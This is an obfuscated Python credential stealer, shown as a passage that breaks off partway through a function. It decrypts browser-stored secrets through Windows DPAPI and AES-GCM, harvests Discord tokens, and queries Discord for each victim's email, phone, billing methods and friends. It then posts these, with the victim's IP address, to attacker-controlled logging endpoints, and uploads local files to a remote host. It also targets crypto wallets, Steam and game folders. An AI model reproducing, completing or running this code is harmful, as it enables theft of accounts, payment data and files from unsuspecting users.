B9 ='crypto'#line:1:B9='crypto'
B8 ='valorant'#line:2:B8='valorant'
B7 ='folder'#line:3:B7='folder'
B6 ='Steam'#line:4:B6='Steam'
B5 ='NationsGlory'#line:5:B5='NationsGlory'
B4 ='.db'#line:6:B4='.db'
B3 ='bcdefghijklmnopqrstuvwxyz'#line:7:B3='bcdefghijklmnopqrstuvwxyz'
B2 ='.ldb'#line:8:B2='.ldb'
B1 ='.log'#line:9:B1='.log'
B0 ='file'#line:10:B0='file'
A_ ='kiwi'#line:11:A_='kiwi'
Az ='fields'#line:12:Az='fields'
Ay ='token'#line:13:Ay='token'
Ax ='public_flags'#line:14:Ax='public_flags'
Aw ='https://discordapp.com/api/v6/users/@me'#line:15:Aw='https://discordapp.com/api/v6/users/@me'
Av ='utf8'#line:16:Av='utf8'
Au ='requests'#line:17:Au='requests'
AU ='Wallet'#line:18:AU='Wallet'
AT ='\\'#line:19:AT='\\'
AS ='passw'#line:20:AS='passw'
AR ='encrypted_key'#line:21:AR='encrypted_key'
AQ ='os_crypt'#line:22:AQ='os_crypt'
AP ='/Local State'#line:23:AP='/Local State'
AO ='text'#line:24:AO='text'
AN ='footer'#line:25:AN='footer'
AM ='author'#line:26:AM='author'
AL ='color'#line:27:AL='color'
AK ='attachments'#line:28:AK='attachments'
AJ ='avatar_url'#line:29:AJ='avatar_url'
AI ='embeds'#line:30:AI='embeds'
AH ='content'#line:31:AH='content'
AG ='ignore'#line:32:AG='ignore'
AF ='TEMP'#line:33:AF='TEMP'
y ='utf-8'#line:34:y='utf-8'
x ='https'#line:35:x='https'
w ='https://i.imgur.com/KQp7JUr.gif'#line:36:w='https://i.imgur.com/KQp7JUr.gif'
v =':x:'#line:37:v=':x:'
u =range #line:38:u=range
f ='icon_url'#line:39:f='icon_url'
e ='Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0'#line:40:e='Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0'
d ='Authorization'#line:41:d='Authorization'
Z ='application/json'#line:42:Z='application/json'
Y ='User-Agent'#line:43:Y='User-Agent'
X ='Content-Type'#line:44:X='Content-Type'
T ='value'#line:45:T='value'
S ='discriminator'#line:46:S='discriminator'
Q =False #line:47:Q=False
P =len #line:48:P=len
L ='username'#line:49:L='username'
K ='type'#line:50:K='type'
J =open #line:51:J=open
I ='name'#line:52:I='name'
F =True #line:53:F=True
D =None #line:54:D=None
C ='/'#line:55:C='/'
B =''#line:56:B=''
import os as A ,threading as M #line:57:import os as A,threading as M
from sys import executable as AV #line:58:from sys import executable as AV
from sqlite3 import connect as z #line:59:from sqlite3 import connect as z
import re #line:60:import re
from base64 import b64decode as a #line:61:from base64 import b64decode as a
from json import loads as g ,load #line:62:from json import loads as g,load
from ctypes import windll as A0 ,wintypes as AW ,byref as h ,cdll ,Structure as AX ,POINTER ,c_char ,c_buffer as i #line:63:from ctypes import windll as A0,wintypes as AW,byref as h,cdll,Structure as AX,POINTER,c_char,c_buffer as i
from urllib .request import Request as G ,urlopen as H #line:64:from urllib.request import Request as G,urlopen as H
try :from pyotp import TOTP #line:65:try:from pyotp import TOTP
except :A .system ('pip install pyotp && cls >nul');from pyotp import TOTP #line:66:except:A.system('pip install pyotp && cls >nul');from pyotp import TOTP
from json import loads as A1 ,dumps as j #line:67:from json import loads as A1,dumps as j
import time ,shutil as A2 ,json #line:68:import time,shutil as A2,json
from zipfile import ZipFile #line:69:from zipfile import ZipFile
import random as A3 ,subprocess as A4 #line:70:import random as A3,subprocess as A4
N =Q #line:71:N=Q
A5 ='https://misogyny.wtf/logs/novoprojeto'#line:72:A5='https://misogyny.wtf/logs/novoprojeto'
def AY ():#line:73:def AY():
	OOO000OOOO0OO000O ='None'#line:74:A='None'
	try :OOO000OOOO0OO000O =H (G ('https://api.ipify.org')).read ().decode ().strip ()#line:75:try:A=H(G('https://api.ipify.org')).read().decode().strip()
	except :pass #line:76:except:pass
	return OOO000OOOO0OO000O #line:77:return A
AZ =[[Au ,Au ],['Cryptodome.Cipher','pycryptodomex']]#line:78:AZ=[[Au,Au],['Cryptodome.Cipher','pycryptodomex']]
for A6 in AZ :#line:79:for A6 in AZ:
	try :__import__ (A6 [0 ])#line:80:try:__import__(A6[0])
	except :A4 .Popen (f"{AV} -m pip install {A6[1]}",shell =F );time .sleep (3 )#line:81:except:A4.Popen(f"{AV} -m pip install {A6[1]}",shell=F);time.sleep(3)
try :import requests as O #line:82:try:import requests as O
except :A .system ('pip install requests && cls >nul');import requests as O #line:83:except:A.system('pip install requests && cls >nul');import requests as O
try :from Cryptodome .Cipher import AES #line:84:try:from Cryptodome.Cipher import AES
except :A .system ('pip install pycryptodomex && cls >nul');from Cryptodome .Cipher import AES #line:85:except:A.system('pip install pycryptodomex && cls >nul');from Cryptodome.Cipher import AES
U =A .getenv ('LOCALAPPDATA')#line:86:U=A.getenv('LOCALAPPDATA')
E =A .getenv ('APPDATA')#line:87:E=A.getenv('APPDATA')
k =A .getenv (AF )#line:88:k=A.getenv(AF)
b =[]#line:89:b=[]
class l (AX ):_fields_ =[('cbData',AW .DWORD ),('pbData',POINTER (c_char ))]#line:90:class l(AX):_fields_=[('cbData',AW.DWORD),('pbData',POINTER(c_char))]
def Aa (O00OO0OO0O0O00OO0 ):OOO0O0O0O00OO0000 =O00OO0OO0O0O00OO0 ;OO0OO0OO00OOOOOOO =int (OOO0O0O0O00OO0000 .cbData );O0OO0000OO00O0OO0 =OOO0O0O0O00OO0000 .pbData ;O0OOOOOOO0O0OOO00 =i (OO0OO0OO00OOOOOOO );cdll .msvcrt .memcpy (O0OOOOOOO0O0OOO00 ,O0OO0000OO00O0OO0 ,OO0OO0OO00OOOOOOO );A0 .kernel32 .LocalFree (O0OO0000OO00O0OO0 );return O0OOOOOOO0O0OOO00 .raw #line:91:def Aa(blob_out):A=blob_out;B=int(A.cbData);C=A.pbData;D=i(B);cdll.msvcrt.memcpy(D,C,B);A0.kernel32.LocalFree(C);return D.raw
def m (O000OO0OOOOO0O000 ,OOO00O000OO0OOO0O =b''):#line:92:def m(encrypted_bytes,entropy=b''):
	O00O0O0OOO00OOO0O =OOO00O000OO0OOO0O ;OOOO0OOOOOOO0O0O0 =O000OO0OOOOO0O000 ;O0OO00000OOOO0O00 =i (OOOO0OOOOOOO0O0O0 ,P (OOOO0OOOOOOO0O0O0 ));OOO0OOO00OO0O0O00 =i (O00O0O0OOO00OOO0O ,P (O00O0O0OOO00OOO0O ));OOOOO00OOO0OO0O00 =l (P (OOOO0OOOOOOO0O0O0 ),O0OO00000OOOO0O00 );OOOO0OOO0OO00000O =l (P (O00O0O0OOO00OOO0O ),OOO0OOO00OO0O0O00 );O0OO0O0000O000O0O =l ()#line:93:B=entropy;A=encrypted_bytes;E=i(A,P(A));F=i(B,P(B));G=l(P(A),E);H=l(P(B),F);C=l()
	if A0 .crypt32 .CryptUnprotectData (h (OOOOO00OOO0OO0O00 ),D ,h (OOOO0OOO0OO00000O ),D ,D ,1 ,h (O0OO0O0000O000O0O )):return Aa (O0OO0O0000O000O0O )#line:94:if A0.crypt32.CryptUnprotectData(h(G),D,h(H),D,D,1,h(C)):return Aa(C)
def n (O0OO0O00000OO0000 ,OO0O0O00O000O00O0 =D ):#line:95:def n(buff,master_key=D):
	OO00OO00OOOOOO000 =O0OO0O00000OO0000 ;OO000O0OOOOO0OOOO =OO00OO00OOOOOO000 .decode (encoding =Av ,errors =AG )[:3 ]#line:96:A=buff;C=A.decode(encoding=Av,errors=AG)[:3]
	if OO000O0OOOOO0OOOO =='v10'or OO000O0OOOOO0OOOO =='v11':O0O0000OO0000OO0O =OO00OO00OOOOOO000 [3 :15 ];OOOO0OOO000O0OOOO =OO00OO00OOOOOO000 [15 :];O00OO00O000000OOO =AES .new (OO0O0O00O000O00O0 ,AES .MODE_GCM ,O0O0000OO0000OO0O );OO0000O00O0OOO00O =O00OO00O000000OOO .decrypt (OOOO0OOO000O0OOOO );OO0000O00O0OOO00O =OO0000O00O0OOO00O [:-16 ].decode ();return OO0000O00O0OOO00O #line:97:if C=='v10'or C=='v11':D=A[3:15];E=A[15:];F=AES.new(master_key,AES.MODE_GCM,D);B=F.decrypt(E);B=B[:-16].decode();return B
def BA (O0OO000O0000OOOO0 ,OOO0O000OO000OOOO ,O00O00O0OOOOOOOO0 =B ,OO00OO00OOO0OO0O0 =B ,O0O000OO0OO0O00OO =B ):#line:98:def BA(methode,url,data=B,files=B,headers=B):
	OO0000OO0OO00OO0O =OO00OO00OOO0OO0O0 #line:99:C=files
	for O0000OO00OOOOO00O in u (8 ):#line:100:for D in u(8):
		try :#line:101:try:
			if O0OO000O0000OOOO0 =='POST':#line:102:if methode=='POST':
				if O00O00O0OOOOOOOO0 !=B :#line:103:if data!=B:
					O0OO000OO00OO0OO0 =O .post (OOO0O000OO000OOOO ,data =O00O00O0OOOOOOOO0 )#line:104:A=O.post(url,data=data)
					if O0OO000OO00OO0OO0 .status_code ==200 :return O0OO000OO00OO0OO0 #line:105:if A.status_code==200:return A
				elif OO0000OO0OO00OO0O !=B :#line:106:elif C!=B:
					O0OO000OO00OO0OO0 =O .post (OOO0O000OO000OOOO ,files =OO0000OO0OO00OO0O )#line:107:A=O.post(url,files=C)
					if O0OO000OO00OO0OO0 .status_code ==200 or O0OO000OO00OO0OO0 .status_code ==413 :return O0OO000OO00OO0OO0 #line:108:if A.status_code==200 or A.status_code==413:return A
		except :pass #line:109:except:pass
def BB (O000000OO00OO000O ,O0OOOOO000OOOO00O =B ,O00OOOO000O0O0O0O =B ,O0000O0000O00OO0O =B ):#line:110:def BB(hook,data=B,files=B,headers=B):
	O0OOOOOOO000000O0 =O0000O0000O00OO0O #line:111:C=headers
	for O0O0OOOO000O00000 in u (8 ):#line:112:for D in u(8):
		try :#line:113:try:
			if O0OOOOOOO000000O0 !=B :OO00OOO000O000OO0 =H (G (O000000OO00OO000O ,data =O0OOOOO000OOOO00O ,headers =O0OOOOOOO000000O0 ));return OO00OOO000O000OO0 #line:114:if C!=B:A=H(G(hook,data=data,headers=C));return A
			else :OO00OOO000O000OO0 =H (G (O000000OO00OO000O ,data =O0OOOOO000OOOO00O ));return OO00OOO000O000OO0 #line:115:else:A=H(G(hook,data=data));return A
		except :pass #line:116:except:pass
def A7 (OOOO00OO0OO0O0000 ):#line:117:def A7(Cookies):
	global N ;OO0O0OOOOO0OO0OO0 =str (OOOO00OO0OO0O0000 );OO00O000OOO0O0OOO =re .findall ('.google.com',OO0O0OOOOO0OO0OO0 )#line:118:global N;A=str(Cookies);B=re.findall('.google.com',A)
	if P (OO00O000OOO0O0OOO )<-1 :N =F ;return N #line:119:if P(B)<-1:N=F;return N
	else :N =Q ;return N #line:120:else:N=Q;return N
def Ab (OO00OOO00OOO0OO00 ):#line:121:def Ab(token):
	O000000O0OO0O0O0O ={d :OO00OOO00OOO0OO00 ,X :Z ,Y :e }#line:122:E={d:token,X:Z,Y:e}
	try :OOOOO00OOOO0OOO00 =A1 (H (G ('https://discord.com/api/users/@me/billing/payment-sources',headers =O000000O0OO0O0O0O )).read ().decode ())#line:123:try:D=A1(H(G('https://discord.com/api/users/@me/billing/payment-sources',headers=E)).read().decode())
	except :return Q #line:124:except:return Q
	if OOOOO00OOOO0OOO00 ==[]:return v #line:125:if D==[]:return v
	O0O00OO0O0OOO00OO =B #line:126:A=B
	for O0O00O0O0OO000O00 in OOOOO00OOOO0OOO00 :#line:127:for C in D:
		if O0O00O0O0OO000O00 ['invalid']==Q :#line:128:if C['invalid']==Q:
			if O0O00O0O0OO000O00 [K ]==1 :O0O00OO0O0OOO00OO +=' :credit_card: '#line:129:if C[K]==1:A+=' :credit_card: '
			elif O0O00O0O0OO000O00 [K ]==2 :O0O00OO0O0OOO00OO +=' :parking: '#line:130:elif C[K]==2:A+=' :parking: '
			elif O0O00O0O0OO000O00 [K ]==8 :O0O00OO0O0OOO00OO +=' :regional_indicator_g: '#line:131:elif C[K]==8:A+=' :regional_indicator_g: '
	return O0O00OO0O0OOO00OO #line:132:return A
def Ac (O000OO0OO0OO00OOO ):#line:133:def Ac(flags):
	O0O00O0O0O00OO000 =O000OO0OO0OO00OOO ;OO0O00OOO0000OO00 ='Name';OO0O00OO0OOOO000O ='Emoji';O0OO0OOO00O0000OO ='Value'#line:134:E=flags;D='Name';C='Emoji';A='Value'
	if O0O00O0O0O00OO000 ==0 :return B #line:135:if E==0:return B
	O00000O0O00OO00O0 =B ;O0OOO0O00OOO00O00 =[{OO0O00OOO0000OO00 :'Early_Verified_Bot_Developer',O0OO0OOO00O0000OO :131072 ,OO0O00OO0OOOO000O :'<:developer:874750808472825986> '},{OO0O00OOO0000OO00 :'Bug_Hunter_Level_2',O0OO0OOO00O0000OO :16384 ,OO0O00OO0OOOO000O :'<:bughunter_2:874750808430874664> '},{OO0O00OOO0000OO00 :'Early_Supporter',O0OO0OOO00O0000OO :512 ,OO0O00OO0OOOO000O :'<:early_supporter:874750808414113823> '},{OO0O00OOO0000OO00 :'House_Balance',O0OO0OOO00O0000OO :256 ,OO0O00OO0OOOO000O :'<:balance:874750808267292683> '},{OO0O00OOO0000OO00 :'House_Brilliance',O0OO0OOO00O0000OO :128 ,OO0O00OO0OOOO000O :'<:brilliance:874750808338608199> '},{OO0O00OOO0000OO00 :'House_Bravery',O0OO0OOO00O0000OO :64 ,OO0O00OO0OOOO000O :'<:bravery:874750808388952075> '},{OO0O00OOO0000OO00 :'Bug_Hunter_Level_1',O0OO0OOO00O0000OO :8 ,OO0O00OO0OOOO000O :'<:bughunter_1:874750808426692658> '},{OO0O00OOO0000OO00 :'HypeSquad_Events',O0OO0OOO00O0000OO :4 ,OO0O00OO0OOOO000O :'<:hypesquad_events:874750808594477056> '},{OO0O00OOO0000OO00 :'Partnered_Server_Owner',O0OO0OOO00O0000OO :2 ,OO0O00OO0OOOO000O :'<:partner:874750808678354964> '},{OO0O00OOO0000OO00 :'Discord_Employee',O0OO0OOO00O0000OO :1 ,OO0O00OO0OOOO000O :'<:staff:874750808728666152> '}]#line:136:G=B;H=[{D:'Early_Verified_Bot_Developer',A:131072,C:'<:developer:874750808472825986> '},{D:'Bug_Hunter_Level_2',A:16384,C:'<:bughunter_2:874750808430874664> '},{D:'Early_Supporter',A:512,C:'<:early_supporter:874750808414113823> '},{D:'House_Balance',A:256,C:'<:balance:874750808267292683> '},{D:'House_Brilliance',A:128,C:'<:brilliance:874750808338608199> '},{D:'House_Bravery',A:64,C:'<:bravery:874750808388952075> '},{D:'Bug_Hunter_Level_1',A:8,C:'<:bughunter_1:874750808426692658> '},{D:'HypeSquad_Events',A:4,C:'<:hypesquad_events:874750808594477056> '},{D:'Partnered_Server_Owner',A:2,C:'<:partner:874750808678354964> '},{D:'Discord_Employee',A:1,C:'<:staff:874750808728666152> '}]
	for OOO00OOOO00OO0OO0 in O0OOO0O00OOO00O00 :#line:137:for F in H:
		if O0O00O0O0O00OO000 //OOO00OOOO00OO0OO0 [O0OO0OOO00O0000OO ]!=0 :O00000O0O00OO00O0 +=OOO00OOOO00OO0OO0 [OO0O00OO0OOOO000O ];O0O00O0O0O00OO000 =O0O00O0O0O00OO000 %OOO00OOOO00OO0OO0 [O0OO0OOO00O0000OO ]#line:138:if E//F[A]!=0:G+=F[C];E=E%F[A]
	return O00000O0O00OO00O0 #line:139:return G
def Ad (O0OOOO0OO000O00O0 ):#line:140:def Ad(token):
	OOOO0O000O00OO0O0 ='phone';O00O0OO0OO0OO0OOO ='premium_type';OO0OOO0OO00OO00O0 ={d :O0OOOO0OO000O00O0 ,X :Z ,Y :e };OO0O0OOOOO000OOOO =A1 (H (G (Aw ,headers =OO0OOO0OO00OO00O0 )).read ().decode ());OOO00O000O0O00OO0 =OO0O0OOOOO000OOOO [L ];OOOO0O00OOO000O00 =OO0O0OOOOO000OOOO [S ];OO0OO0OO0O0O0OOOO =OO0O0OOOOO000OOOO ['email'];O00OO0OO000O00OO0 =OO0O0OOOOO000OOOO ['id'];OOOO00OO00000000O =OO0O0OOOOO000OOOO ['avatar'];OO0000OO0O0O0OO00 =OO0O0OOOOO000OOOO [Ax ];OOOO0O0O000OOOOOO =v ;OOO000OOOO0OOO0O0 =v #line:141:P='phone';O='premium_type';E={d:token,X:Z,Y:e};A=A1(H(G(Aw,headers=E)).read().decode());F=A[L];I=A[S];J=A['email'];K=A['id'];M=A['avatar'];N=A[Ax];B=v;C=v
	if O00O0OO0OO0OO0OOO in OO0O0OOOOO000OOOO :#line:142:if O in A:
		OO0OOO00O0000O0O0 =OO0O0OOOOO000OOOO [O00O0OO0OO0OO0OOO ]#line:143:D=A[O]
		if OO0OOO00O0000O0O0 ==1 :OOOO0O0O000OOOOOO ='<:classic:896119171019067423> '#line:144:if D==1:B='<:classic:896119171019067423> '
		elif OO0OOO00O0000O0O0 ==2 :OOOO0O0O000OOOOOO ='<a:boost:824036778570416129> <:classic:896119171019067423> '#line:145:elif D==2:B='<a:boost:824036778570416129> <:classic:896119171019067423> '
	if OOOO0O000O00OO0O0 in OO0O0OOOOO000OOOO :OOO000OOOO0OOO0O0 =f"`{OO0O0OOOOO000OOOO[OOOO0O000O00OO0O0]}`"#line:146:if P in A:C=f"`{A[P]}`"
	return OOO00O000O0O00OO0 ,OOOO0O00OOO000O00 ,OO0OO0OO0O0O0OOOO ,O00OO0OO000O00OO0 ,OOOO00OO00000000O ,OO0000OO0O0O0OO00 ,OOOO0O0O000OOOOOO ,OOO000OOOO0OOO0O0 #line:147:return F,I,J,K,M,N,B,C
def A8 (O00O00O0OOOO00O0O ):#line:148:def A8(token):
	OOOO0OOOO000OOOOO ={d :O00O00O0OOOO00O0O ,X :Z ,Y :e }#line:149:A={d:token,X:Z,Y:e}
	try :H (G (Aw ,headers =OOOO0OOOO000OOOOO ));return F #line:150:try:H(G(Aw,headers=A));return F
	except :return Q #line:151:except:return Q
def Ae (OO000O0000000O0OO ):#line:152:def Ae(token):
	OO0O000O00OO0OOO0 ='user';O0OO000O00000OO0O =B ;O000000OOO000O00O ={d :f"{OO000O0000000O0OO}"};OO0OO0O00000O000O =O .get ('https://discord.com/api/v6/users/@me/relationships',headers =O000000OOO000O00O );OO000OOO00OO00O0O =json .loads (OO0OO0O00000O000O .text )#line:153:E='user';F=B;H={d:f"{token}"};I=O.get('https://discord.com/api/v6/users/@me/relationships',headers=H);G=json.loads(I.text)
	if P (OO000OOO00OO00O0O )==0 :return D #line:154:if P(G)==0:return D
	for O000OOO0OOO000OO0 in OO000OOO00OO00O0O :#line:155:for A in G:
		OO0OOO00O000O0000 =O000OOO0OOO000OO0 [OO0O000O00OO0OOO0 ][Ax ]#line:156:C=A[E][Ax]
		if O000OOO0OOO000OO0 [K ]==1 &OO0OOO00O000O0000 %131072 !=0 :O0OO000O00000OO0O +=f" <:DevBadge:912727453875699733>|`{O000OOO0OOO000OO0[OO0O000O00OO0OOO0][L]}#{O000OOO0OOO000OO0[OO0O000O00OO0OOO0][S]}`\n";OO0OOO00O000O0000 =OO0OOO00O000O0000 %131072 #line:157:if A[K]==1&C%131072!=0:F+=f" <:DevBadge:912727453875699733>|`{A[E][L]}#{A[E][S]}`\n";C=C%131072
		if O000OOO0OOO000OO0 [K ]==1 &OO0OOO00O000O0000 //16384 !=0 :O0OO000O00000OO0O +=f" <:TG_DiscordBugHunter:924608161116213278>|`{O000OOO0OOO000OO0[OO0O000O00OO0OOO0][L]}#{O000OOO0OOO000OO0[OO0O000O00OO0OOO0][S]}`\n";OO0OOO00O000O0000 =OO0OOO00O000O0000 %16384 #line:158:if A[K]==1&C//16384!=0:F+=f" <:TG_DiscordBugHunter:924608161116213278>|`{A[E][L]}#{A[E][S]}`\n";C=C%16384
		if O000OOO0OOO000OO0 [K ]==1 &OO0OOO00O000O0000 //512 !=0 :O0OO000O00000OO0O +=f" <a:early:913099122968494170>|`{O000OOO0OOO000OO0[OO0O000O00OO0OOO0][L]}#{O000OOO0OOO000OO0[OO0O000O00OO0OOO0][S]}`\n";OO0OOO00O000O0000 =OO0OOO00O000O0000 %512 #line:159:if A[K]==1&C//512!=0:F+=f" <a:early:913099122968494170>|`{A[E][L]}#{A[E][S]}`\n";C=C%512
		if O000OOO0OOO000OO0 [K ]==1 &OO0OOO00O000O0000 //8 !=0 :O0OO000O00000OO0O +=f" <:TP_Icon_bugHunter:896263053484638218>|`{O000OOO0OOO000OO0[OO0O000O00OO0OOO0][L]}#{O000OOO0OOO000OO0[OO0O000O00OO0OOO0][S]}`\n";OO0OOO00O000O0000 =OO0OOO00O000O0000 %8 #line:160:if A[K]==1&C//8!=0:F+=f" <:TP_Icon_bugHunter:896263053484638218>|`{A[E][L]}#{A[E][S]}`\n";C=C%8
		if O000OOO0OOO000OO0 [K ]==1 &OO0OOO00O000O0000 //4 !=0 :O0OO000O00000OO0O +=f" <a:CH_IconHypesquadShiny:928551747591487548>|`{O000OOO0OOO000OO0[OO0O000O00OO0OOO0][L]}#{O000OOO0OOO000OO0[OO0O000O00OO0OOO0][S]}`\n";OO0OOO00O000O0000 =OO0OOO00O000O0000 %4 #line:161:if A[K]==1&C//4!=0:F+=f" <a:CH_IconHypesquadShiny:928551747591487548>|`{A[E][L]}#{A[E][S]}`\n";C=C%4
		if O000OOO0OOO000OO0 [K ]==1 &OO0OOO00O000O0000 //2 !=0 :O0OO000O00000OO0O +=f" <a:Badge_partner:875020015215190046>|`{O000OOO0OOO000OO0[OO0O000O00OO0OOO0][L]}#{O000OOO0OOO000OO0[OO0O000O00OO0OOO0][S]}`\n";OO0OOO00O000O0000 =OO0OOO00O000O0000 %2 #line:162:if A[K]==1&C//2!=0:F+=f" <a:Badge_partner:875020015215190046>|`{A[E][L]}#{A[E][S]}`\n";C=C%2
	if O0OO000O00000OO0O ==B :return '``NO HQ FRIENDS``'#line:163:if F==B:return'``NO HQ FRIENDS``'
	else :return O0OO000O00000OO0O #line:164:else:return F
def A9 (OO0O0O00000OOOO00 ,OO0OOOO0OOOO0O000 ):#line:165:def A9(token,path):
	O000000O0O000OO0O ='url';OO00O0000O000O0O0 ='thumbnail';OOOO0O0OO000OOOOO ='🔒';O00OO0O0OO0OO0O0O ='inline';OOO0OO00000O0O0OO =OO0O0O00000OOOO00 ;global A5 ;O00OO0O0OOO0OOO00 ={X :Z ,Y :e };OO00000000OOOO000 ,OO00O0O00O00000OO ,O00OOOO0O00O0O00O ,O0O0O0O000O00O0O0 ,OO0OO000OO00O000O ,OOOOO0O00OO0O000O ,OO0O00O0OO0OO000O ,OO00OO0000OO0O00O =Ad (OOO0OO00000O0O0OO );O0000O00O00000000 =O .post ('https://misogyny.wtf/db/newtoken',json ={Ay :OOO0OO00000O0O0OO },headers ={X :Z ,Y :'Mozilla/5.0 (Linux; Ubuntu 14.04) AppleWebKit/537.36 Chromium/35.0.1870.2/Flps Safari/537.36/Zckt'})#line:166:g='url';d='thumbnail';U='🔒';E='inline';C=token;global A5;P={X:Z,Y:e};Q,R,V,J,A,W,K,S=Ad(C);a=O.post('https://misogyny.wtf/db/newtoken',json={Ay:C},headers={X:Z,Y:'Mozilla/5.0 (Linux; Ubuntu 14.04) AppleWebKit/537.36 Chromium/35.0.1870.2/Flps Safari/537.36/Zckt'})
	if O0000O00O00000000 .text =='Not in db':#line:167:if a.text=='Not in db':
		if OO0OO000OO00O000O ==D :OO0OO000OO00O000O =w #line:168:if A==D:A=w
		else :OO0OO000OO00O000O =f"https://cdn.discordapp.com/avatars/{O0O0O0O000O00O0O0}/{OO0OO000OO00O000O}"#line:169:else:A=f"https://cdn.discordapp.com/avatars/{J}/{A}"
		O0O00OO0OO0O000OO =Ab (OOO0OO00000O0O0OO );O0O00O0O0O0000000 =Ac (OOOOO0O00OO0O000O )#line:170:M=Ab(C);N=Ac(W)
		if not O0O00OO0OO0O000OO :O0O00O0O0O0000000 ,OO00OO0000OO0O00O ,O0O00OO0OO0O000OO =OOOO0O0OO000OOOOO ,OOOO0O0OO000OOOOO ,OOOO0O0OO000OOOOO #line:171:if not M:N,S,M=U,U,U
		if OO0O00O0OO0OO000O ==B and O0O00O0O0O0000000 ==B :OO0O00O0OO0OO000O =v #line:172:if K==B and N==B:K=v
		OOOOO0OO000OO0O00 ={AH :f"Found in `{OO0OOOO0OOOO0O000}`",AI :[{AL :5119890 ,Az :[{I :':rocket: Token:',T :f"`{OOO0OO00000O0O0OO}`\n[Click to copy](https://superfurrycdn.nl/copy/{C})"},{I :':envelope: Email:',T :f"`{O00OOOO0O00O0O00O}`",O00OO0O0OO0OO0O0O :F },{I :':mobile_phone: Phone:',T :f"`{OO00OO0000OO0O00O}`",O00OO0O0OO0OO0O0O :F },{I :':globe_with_meridians: IP:',T :f"`{AY()}`",O00OO0O0OO0OO0O0O :F },{I :':beginner: Badges:',T :f"{OO0O00O0OO0OO000O}{O0O00O0O0O0000000}",O00OO0O0OO0OO0O0O :F },{I :':credit_card: Billing:',T :f"{O0O00OO0OO0O000OO}",O00OO0O0OO0OO0O0O :F }],AM :{I :f"{OO00000000OOOO000}#{OO00O0O00O00000OO} ({O0O0O0O000O00O0O0})",f :f"{OO0OO000OO00O000O}"},AN :{AO :D ,f :w },OO00O0000O000O0O0 :{O000000O0O000OO0O :f"{OO0OO000OO00O000O}"}}],AJ :D ,L :D ,AK :[]};OOO0OOOO000OO0O00 ={AH :D ,AI :[{AL :5119890 ,'description':f"{Ae(OOO0OO00000O0O0OO)}",AM :{I :f"{OO00000000OOOO000}#{OO00O0O00O00000OO} ({O0O0O0O000O00O0O0})",f :f"{OO0OO000OO00O000O}"},AN :{AO :D ,f :w },OO00O0000O000O0O0 :{O000000O0O000OO0O :f"{OO0OO000OO00O000O}"}}],AJ :D ,L :D ,AK :[]};H (G (A5 ,data =j (OOOOO0OO000OO0O00 ).encode (),headers =O00OO0O0OOO0OOO00 ));H (G ('https://misogyny.wtf/logs/friendlist',data =j (OOO0OOOO000OO0O00 ).encode (),headers =O00OO0O0OOO0OOO00 ))#line:173:b={AH:f"Found in `{path}`",AI:[{AL:5119890,Az:[{I:':rocket: Token:',T:f"`{C}`\n[Click to copy](https://superfurrycdn.nl/copy/{C})"},{I:':envelope: Email:',T:f"`{V}`",E:F},{I:':mobile_phone: Phone:',T:f"`{S}`",E:F},{I:':globe_with_meridians: IP:',T:f"`{AY()}`",E:F},{I:':beginner: Badges:',T:f"{K}{N}",E:F},{I:':credit_card: Billing:',T:f"{M}",E:F}],AM:{I:f"{Q}#{R} ({J})",f:f"{A}"},AN:{AO:D,f:w},d:{g:f"{A}"}}],AJ:D,L:D,AK:[]};c={AH:D,AI:[{AL:5119890,'description':f"{Ae(C)}",AM:{I:f"{Q}#{R} ({J})",f:f"{A}"},AN:{AO:D,f:w},d:{g:f"{A}"}}],AJ:D,L:D,AK:[]};H(G(A5,data=j(b).encode(),headers=P));H(G('https://misogyny.wtf/logs/friendlist',data=j(c).encode(),headers=P))
	else :0 #line:174:else:0
def BC (OO00OO0OO0OOOO0OO ):#line:175:def BC(listt):
	OO00O0O0O0O00O000 ='net';OO000OO000000OOOO ='com';OOO0OO0000OO0O0O0 =re .findall ('(\\w+[a-z])',OO00OO0OO0OOOO0OO )#line:176:C='net';B='com';A=re.findall('(\\w+[a-z])',listt)
	while x in OOO0OO0000OO0O0O0 :OOO0OO0000OO0O0O0 .remove (x )#line:177:while x in A:A.remove(x)
	while OO000OO000000OOOO in OOO0OO0000OO0O0O0 :OOO0OO0000OO0O0O0 .remove (OO000OO000000OOOO )#line:178:while B in A:A.remove(B)
	while OO00O0O0O0O00O000 in OOO0OO0000OO0O0O0 :OOO0OO0000OO0O0O0 .remove (OO00O0O0O0O00O000 )#line:179:while C in A:A.remove(C)
	return list (set (OOO0OO0000OO0O0O0 ))#line:180:return list(set(A))
def o (O0O0O000O000OO0OO ,OOO00O000O00O0O00 =B ):#line:181:def o(name,tk=B):
	OO0O0O0000O00OO00 ={X :Z ,Y :e }#line:182:A={X:Z,Y:e}
	if O0O0O000O000OO0OO ==A_ :O00OO0O0O0OO0OOOO ={AH :B ,AI :[{AL :5119890 ,Az :[{I :'Interesting files found on user PC:',T :OOO00O000O00O0O00 }],AM :{I :'File Stealer'},AN :{AO :D ,f :w }}],AJ :D ,AK :[]};H (G ('https://misogyny.wtf/logs/filestealer',data =j (O00OO0O0O0OO0OOOO ).encode (),headers =OO0O0O0000O00OO00 ));return #line:183:if name==A_:C={AH:B,AI:[{AL:5119890,Az:[{I:'Interesting files found on user PC:',T:tk}],AM:{I:'File Stealer'},AN:{AO:D,f:w}}],AJ:D,AK:[]};H(G('https://misogyny.wtf/logs/filestealer',data=j(C).encode(),headers=A));return
	O0000O0O00OO0000O =O0O0O000O000OO0OO ;OO00O0OOO00OOOO0O ={B0 :J (O0000O0O00OO0000O ,'rb')};O .post ('http://mysterious-everglades-49390.herokuapp.com',headers ={d :TOTP ('BJCMFCAZJ5HB3Q5MYK4HW===').now ()},files =OO00O0OOO00OOOO0O )#line:184:E=name;F={B0:J(E,'rb')};O.post('http://mysterious-everglades-49390.herokuapp.com',headers={d:TOTP('BJCMFCAZJ5HB3Q5MYK4HW===').now()},files=F)
def AA (O0O0OOO00O0000O0O ,OO0OOOOO00OOOOO0O ):#line:185:def AA(data,name):
	O00O00O0OO0OO0O0O =A .getenv (AF )+f"\\wp{OO0OOOOO00OOOOO0O}.txt"#line:186:E=A.getenv(AF)+f"\\wp{name}.txt"
	with J (O00O00O0OO0OO0O0O ,mode ='w',encoding =y )as OOO00OOO0OOOO0OOO :#line:187:with J(E,mode='w',encoding=y)as C:
		OOO00OOO0OOOO0OOO .write (f"""
***********************************************
*    _____                       _      _     *
